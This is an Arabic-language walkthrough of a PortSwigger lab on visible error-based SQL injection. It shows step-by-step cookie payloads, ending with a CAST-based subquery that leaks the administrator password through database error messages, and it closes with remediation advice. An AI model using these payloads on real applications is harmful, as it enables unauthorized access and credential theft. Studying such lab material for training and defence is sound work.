# [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

## **`الهدف`**
قم بتنفيذ هجوم `Blind SQLi` لمعرفة كلمة مرور حساب `administrator` ثم قم بتسجيل الدخول إليه.
## **`خطوات الحل`**
بمجرد الدخول إلى صفحة الموقع سنقوم بتحويل الطلب الرئيسي للدخول للموقع إلى `Repeater`

```http
GET / HTTP/2
Host: 0aa900ff03bf558d804b62bd0074009b.web-security-academy.net
Cookie: TrackingId=h0YuMycqjG0K1loq; session=qud9BMGL21CfP2mgfDNJ3ZOLekyTiWSB
```

ثم سنقوم بحقن أوامر استعلام في الـ `TrackingId` داخل `Inspector` لسحب كلمة مرور حساب `administrator`.

**`أولًا:`** سنقوم بحقن الأمر التالي ونقوم بإرسال الطلب:
```sql
h0YuMycqjG0K1loq'
```
لنجد الإستجابة بها رسالة الخطأ التالية:
```http
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'h0YuMycqjG0K1loq''. Expected  char
```
وهذا يعني أنه هناك سلسة نصية غير مغلقة وهذا يحدث لأن الاستعلام الأصلي في السيرفر يكون عادة بهذا الشكل:
```sql
SELECT * FROM tracking WHERE id = 'ogAZZfxtOKUELbuJ'
```
وعند وضع علامة تنصيص إضافية (`'`)، يصبح الاستعلام:
```sql
SELECT * FROM tracking WHERE id = 'ogAZZfxtOKUELbuJ''
```
فتعترض قاعدة البيانات لأن علامة التنصيص الأخيرة تُركت مفتوحة، فتُرجع رسالة خطأ تُظهر الاستعلام، مما يؤكد وجود الثغرة وأن المدخلات تُدمج كنص `String literal`.

**`ثانيًا:`** سنقوم بحقن الأمر التالي ونقوم بإرسال الطلب:
```sql
h0YuMycqjG0K1loq'--
```
وسنجد أنه لا يوجد رسالة خطأ وهذا لأن الرمز `--` يجعل قاعدة البيانات تتجاهل كل ما يأتي بعده، وهذا يلغي علامة التنصيص الأصلية المتبقية من الاستعلام الأصلي، وبالتالي يصبح الاستعلام صحيحاً نحوياً وتختفي رسالة الخطأ.

**`ثالثًا:`** سنقوم بحقن الأمر التالي ونقوم بإرسال الطلب:
```sql
h0YuMycqjG0K1loq' AND CAST((SELECT 1) AS int)--
```
لنجد الإستجابة بها رسالة الخطأ التالية:
```http
ERROR: argument of AND must be type boolean, not type integer
Position: 63
```
ويحدث هذا لأن دالة `CAST(... AS int)` تحاول تحويل القيمة المستخرجة إلى رقم صحيح `Integer`، لكن المعامل `AND` يحتاج إلى تعبير منطقي كامل (شرط نتيجته `TRUE` أو `FALSE`) وليس مجرد رقم، لذلك أرجعت قاعدة البيانات خطأ: `AND condition must be a boolean expression`.

**`رابعًا:`** سنقوم بحقن الأمر التالي ونقوم بإرسال الطلب:
```sql
h0YuMycqjG0K1loq' AND 1=CAST((SELECT 1) AS int)--
```
وسنجد أنه لا يوجد رسالة خطأ وهذا لأن إضافة `1=` تجعل التعبير به شرطاً منطقياً كاملًا (`1 = 1` وهو `TRUE`)، مما يجعل الاستعلام صحيحاً نحوياً، وهذا يعنى أن دمج دالة `CAST` داخل الشرط يعمل بنجاح.

**`خامسًأ:`** سنقوم بحقن الأمر التالي ونقوم بإرسال الطلب:
```sql
h0YuMycqjG0K1loq' AND 1=CAST((SELECT username FROM users) AS int)--
```
لنجد الإستجابة بها رسالة الخطأ التالية:
```http
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'h0YuMycqjG0K1loq' AND 1=CAST((SELECT username FROM users) AS'. Expected  char
```
ويحدث هذا لأن هناك حد أقصى لعدد الأحرف وبالتالي قد تم قص أمر الإستعلام مما أدى إلى حذف رمز التعليق `--` مما أعاد خطأ علامة التنصيص غير مغلقة.

**`سادسًا:`** سنقوم بحقن نفس الأمر السابق ولكن سنحذف الجزء الخاص بالـ `TrackingId` ونقوم بإرسال الطلب:
```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```
لنجد الإستجابة بها رسالة الخطأ التالية:
```http
ERROR: more than one row returned by a subquery used as an expression
```
ويحدث هذا لأن دالة `CAST` تتوقع قيمة واحدة فقط، بينما جدول `users` يحتوي على عدة صفوف.

**`سابعًا:`** سنقوم بحقن نفس الأمر السابق ولكن سنضيف الجزء الخاص بـ `LIMIT 1` لجلب أول صف فقط، ونقوم بإرسال الطلب:
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
لنجد الإستجابة بها رسالة الخطأ التالية:
```http
ERROR: invalid input syntax for type integer: "administrator"
```
ويحدث هذا لأن قاعدة البيانات تنفذ الاستعلام الداخلي وتجلب القيمة الأولى في الجدول `administrator`، ثم تحاول تحويل هذه الكلمة النصية إلى رقم صحيح عبر `CAST(... AS int)`، ولأن الكلمة ليست رقماً، ترمي قاعدة البيانات خطأ يوضح القيمة الفاشلة، وبالتالي يتم تسريب اسم المستخدم من خلال نص الخطأ.

**`ثامنًا:`** سنقوم بحقن الأمر الأخير لسحب كلمة المرور، ونقوم بإرسال الطلب:
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
لنجد الإستجابة بها رسالة الخطأ التالية:
```http
ERROR: invalid input syntax for type integer: "8qqaw6wki4m7nuolip91"
```
ويحدث هذا لنفس السبب في النقطة السابقة حيث ستحاول قاعدة البيانات تحويل نص الـ `Password` إلى رقم وتفشل، فتطبع كلمة المرور الحقيقية للمستخدم الأول `administrator` داخل رسالة الخطأ.

**`أخيرًا:`** سنقوم بتسجيل الدخول إلى حساب `administrator` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)

ولكن بتعديل بسيط في النقطة الثانية من الترقيع حيث ستصبح:  
ويجب التحقق من مدخلات المستخدم ومطابقتها مع قائمة بيضاء محددة مسبقا قبل تمريرها إلى قاعدة البيانات، وبما أن قيمة الـ `TrackingId` داخل الـ `Cookie` تكون معروفة الهيكلة وتتكون فقط من حروف وأرقام `Alphanumeric` وبطول ثابت، فيجب ألا يتم قبول أي مدخل يخرج عن هذا النطاق مثل احتوائه على علامات اقتباس أو رموز خاصة أو بطول أكبر من المُحدد، ويقوم التطبيق برفض الطلب فوراً إذا كان المدخل غير صالح.

ويجب إعداد التطبيق بحيث يلتقط هذه الأخطاء `Catch exceptions` في الخلفية، ويقوم بتسجيلها في ملفات السجلات`Logs` الخاصة بالسيرفر، بينما يعرض للمستخدم رسالة خطأ عامة جداً` (Generic Error)` مثل `An error occurred` دون إعطاء أي تفاصيل
